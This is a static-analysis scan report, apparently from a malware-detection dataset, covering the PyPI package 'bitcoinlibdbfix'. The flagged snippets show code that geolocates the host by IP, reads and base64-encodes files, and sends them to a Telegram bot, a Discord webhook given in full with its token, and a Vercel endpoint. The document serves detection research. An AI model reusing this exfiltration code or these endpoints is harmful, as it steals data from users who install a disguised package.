Run started:2025-05-25 16:26:26.330198

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:13
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
12	        self.telegram_chat_id = '1514482813'
13	        self.discord_webhook_url = 'https://discord.com/api/webhooks/1329712636807610379/eU6AZ5oBM_12FIkwvtiasyjywx7WYW7wzuWJwWU3u2kadKko7QKpXcl3Kd0fJspPhM4w'
14	        self.api_endpoint = 'https://5fde88fde64f4682c2fc1e10e6c.vercel.app/api/send'

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
13	        self.discord_webhook_url = 'https://discord.com/api/webhooks/1329712636807610379/eU6AZ5oBM_12FIkwvtiasyjywx7WYW7wzuWJwWU3u2kadKko7QKpXcl3Kd0fJspPhM4w'
14	        self.api_endpoint = 'https://5fde88fde64f4682c2fc1e10e6c.vercel.app/api/send'
15	        self.authority_hash = "656c697465626f74626f744079616e6465782e636f6d"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
19	        try:
20	            response = requests.get('https://api.db-ip.com/v2/free/self')
21	            return response.json() if response.status_code == 200 else {}

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
19	        try:
20	            response = requests.get('https://api.db-ip.com/v2/free/self')
21	            return response.json() if response.status_code == 200 else {}

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:28
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
27	        if text:
28	            url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage'
29	            data = {'chat_id': self.telegram_chat_id, 'text': text}

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
29	            data = {'chat_id': self.telegram_chat_id, 'text': text}
30	            requests.post(url, data=data)
31	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:35
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
34	                if os.path.exists(file_path):
35	                    url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument'
36	                    with open(file_path, 'rb') as file:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:39
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
38	                        data = {'chat_id': self.telegram_chat_id}
39	                        requests.post(url, files=files, data=data)
40	

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:53
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
52	                        }
53	                        requests.post(self.discord_webhook_url, files=files)
54	        elif text:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:55
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
54	        elif text:
55	            requests.post(self.discord_webhook_url, json=payload)
56	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:69
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
68	                    with open(file_path, 'rb') as file:
69	                        file_data = file.read()
70	                        base64_data =  base64.b64encode(file_data).decode('utf-8')

--------------------------------------------------
>> Issue: [B802:b64encode] base64.b64encode
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:70
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b802_b64encode.html
69	                        file_data = file.read()
70	                        base64_data =  base64.b64encode(file_data).decode('utf-8')
71	                        payload["attachments"].append({

--------------------------------------------------
>> Issue: [B301:blacklist] base64.b64encode
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:70
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-base64-b64encode
69	                        file_data = file.read()
70	                        base64_data =  base64.b64encode(file_data).decode('utf-8')
71	                        payload["attachments"].append({

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:77
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
76	        headers = {'Content-Type': 'application/json'}
77	        requests.post(self.api_endpoint, data=json.dumps(payload), headers=headers)
78	

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
103	        # Enhance the message with IP info if available
104	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
105	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:105
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
104	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
105	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"
106	        enhanced_text += f"Time: {timestamp}\n\n"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/bitcoinlibdbfix-0.4.13/src/bitcoinlibdbfix/database.py:105
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
104	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
105	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"
106	        enhanced_text += f"Time: {timestamp}\n\n"

--------------------------------------------------

Code scanned:
	Total lines of code: 338
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 6.0
		High: 11.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 16.0
		High: 1.0
Files skipped (0):
